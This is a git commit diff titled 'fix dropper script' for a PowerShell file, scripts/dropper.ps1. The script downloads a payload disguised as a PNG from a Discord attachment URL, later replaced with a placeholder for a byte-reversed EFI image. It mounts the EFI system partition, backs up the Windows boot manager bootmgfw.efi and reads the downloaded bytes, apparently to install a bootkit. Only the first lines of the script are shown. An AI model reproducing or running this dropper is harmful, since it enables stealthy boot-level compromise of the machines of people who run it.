89470d5d54e771d26e98b40d65fc79bff8bfc217
leo78450 <harpiemangue37@gmail.com>
2022-07-13 22:41:26 +0200

    fix dropper script

--- scripts/dropper.ps1
+++ scripts/dropper.ps1
@@ -1,4 +1,4 @@
-Invoke-WebRequest -Uri "https://cdn.discordapp.com/attachments/674573769422929920/981664019926646834/file.png" -OutFile "C:\Windows\Temp\file.png";
+Invoke-WebRequest -Uri "link to efi image in reversed bytes" -OutFile "C:\Windows\Temp\file.png";
 mountvol Y: /s;
 Copy-Item -Path Y:\EFI\Microsoft\Boot\bootmgfw.efi -Destination Y:\EFI\Microsoft\Boot\bootmgfw.efi.old;
 $file = [io.file]::ReadAllBytes("C:\Windows\Temp\file.png");
